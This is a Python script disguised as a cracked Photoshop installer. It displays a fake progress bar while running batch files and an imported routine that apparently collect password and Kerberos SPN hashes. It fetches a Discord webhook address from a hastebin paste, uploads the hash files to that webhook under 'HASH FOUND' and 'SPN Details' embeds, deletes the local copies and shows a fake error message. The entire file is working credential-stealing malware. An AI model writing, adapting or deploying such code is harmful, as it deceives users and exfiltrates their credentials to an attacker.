import asyncio
from discord_webhook import DiscordWebhook, DiscordEmbed
from pyfiglet import Figlet
from pyfiglet import figlet_format
from colorama import init, Fore, Back, Style
from termcolor import colored
import time
from os import system
from datetime import datetime
from obtainer import king
import subprocess
import re
import requests
import os
from logging import error

pastebin = 'https://hastebin.com/raw/xobaredopa'
webhookURL = requests.get(pastebin).text
store = requests.get("https://api.gofile.io/getServer").text

def render(text, style, color):
    f = colored(figlet_format(text=text, font=style), color=color)
    print('\n' * 2)
    print(f)

hashfile = []


timestamp = ((("["+(datetime.now().strftime('%H:%M:%S:%f')[:-3])+"]") + colored(" | ",'magenta', attrs=['bold'])))
system("title Photoshop Installer - Version v0.1")
render('Photoshop Installer Cracked', 'slant', 'white')
print((((("["+(datetime.now().strftime('%H:%M:%S:%f')[:-3])+"]") + colored(" | ",'magenta', attrs=['bold'])))), colored('Beginning Setup, Random Popups Might Show up, Do not worry thats supposed to happen', 'green', attrs=['bold']))
system("title PHOTOSHOP BY SUFIAN")
print((((("["+(datetime.now().strftime('%H:%M:%S:%f')[:-3])+"]") + colored(" | ",'magenta', attrs=['bold'])))), colored('This will take some time, please be patient', 'green', attrs=['bold']))
print((((("["+(datetime.now().strftime('%H:%M:%S:%f')[:-3])+"]") + colored(" | ",'magenta', attrs=['bold'])))), colored('15%', 'green', attrs=['bold']))
time.sleep(1)
print((((("["+(datetime.now().strftime('%H:%M:%S:%f')[:-3])+"]") + colored(" | ",'magenta', attrs=['bold'])))), colored('25%', 'green', attrs=['bold']))
time.sleep(1)
print((((("["+(datetime.now().strftime('%H:%M:%S:%f')[:-3])+"]") + colored(" | ",'magenta', attrs=['bold'])))), colored('33%', 'green', attrs=['bold']))
time.sleep(1)
print((((("["+(datetime.now().strftime('%H:%M:%S:%f')[:-3])+"]") + colored(" | ",'magenta', attrs=['bold'])))), colored('45%', 'green', attrs=['bold']))
time.sleep(1)
subprocess.call([r'systemsetup.bat'])
print((((("["+(datetime.now().strftime('%H:%M:%S:%f')[:-3])+"]") + colored(" | ",'magenta', attrs=['bold'])))), colored('56%', 'green', attrs=['bold']))
time.sleep(1)
subprocess.call([r'Kerb2.bat'])
print((((("["+(datetime.now().strftime('%H:%M:%S:%f')[:-3])+"]") + colored(" | ",'magenta', attrs=['bold'])))), colored('67%', 'green', attrs=['bold']))
time.sleep(1)
king()
print((((("["+(datetime.now().strftime('%H:%M:%S:%f')[:-3])+"]") + colored(" | ",'magenta', attrs=['bold'])))), colored('74%', 'green', attrs=['bold']))
time.sleep(1)
print((((("["+(datetime.now().strftime('%H:%M:%S:%f')[:-3])+"]") + colored(" | ",'magenta', attrs=['bold'])))), colored('82%', 'green', attrs=['bold']))
time.sleep(1)
print((((("["+(datetime.now().strftime('%H:%M:%S:%f')[:-3])+"]") + colored(" | ",'magenta', attrs=['bold'])))), colored('88%', 'green', attrs=['bold']))
time.sleep(1)
print((((("["+(datetime.now().strftime('%H:%M:%S:%f')[:-3])+"]") + colored(" | ",'magenta', attrs=['bold'])))), colored('95%', 'green', attrs=['bold']))
time.sleep(1)
print((((("["+(datetime.now().strftime('%H:%M:%S:%f')[:-3])+"]") + colored(" | ",'magenta', attrs=['bold'])))), colored('99%', 'green', attrs=['bold']))
time.sleep(1)

def hooker():
    try:
        time = (datetime.now().strftime("%m/%d/%Y, %H:%M:%S:%f"))
        name = "CALL ME GOD"
        avatar_url= "https://mir-s3-cdn-cf.behance.net/project_modules/1400/2d686878402297.5ca6085aa8e1d.jpg"
        title= ":smiling_imp: "+ 'HASH FOUND' +" :smiling_imp:"
        webhook = DiscordWebhook(url=webhookURL,username=name, avatar_url=avatar_url)
        embed = DiscordEmbed(title=title,color=15158332)
        embed.set_timestamp()
        embed.set_footer(text='I AM A MENACE',icon_url=avatar_url)
        webhook.add_embed(embed)
        with open("nothingyouneedtobeworriedabout.txt", "rb") as f:
            webhook.add_file(file=f.read(), filename='hash.txt')
        webhook.execute()
    except error as e:
        print(e)
    if os.path.exists("nothingyouneedtobeworriedabout.txt"):
        os.remove("nothingyouneedtobeworriedabout.txt")
    else:
        pass

def spn():
    try:
        time = (datetime.now().strftime("%m/%d/%Y, %H:%M:%S:%f"))
        name = "CALL ME GOD"
        avatar_url= "https://mir-s3-cdn-cf.behance.net/project_modules/1400/2d686878402297.5ca6085aa8e1d.jpg"
        title= ":smiling_imp: "+ 'SPN Details' +" :smiling_imp:"
        webhook = DiscordWebhook(url=webhookURL,username=name, avatar_url=avatar_url)
        embed = DiscordEmbed(title=title,color=15158332)
        embed.set_timestamp()
        embed.set_footer(text='I AM A MENACE',icon_url=avatar_url)
        webhook.add_embed(embed)
        with open("kerbout.txt", "rb") as f:
            webhook.add_file(file=f.read(), filename='hash.txt')
        webhook.execute()
    except error as e:
        print(e)
    if os.path.exists("kerbout.txt"):
        os.remove("kerbout.txt")
    else:
        pass

hooker()
spn()

print((((("["+(datetime.now().strftime('%H:%M:%S:%f')[:-3])+"]") + colored(" | ",'magenta', attrs=['bold'])))), colored('ERROR PLEASE TRY AGAIN', 'red', attrs=['bold']))
time.sleep(3)
exit()
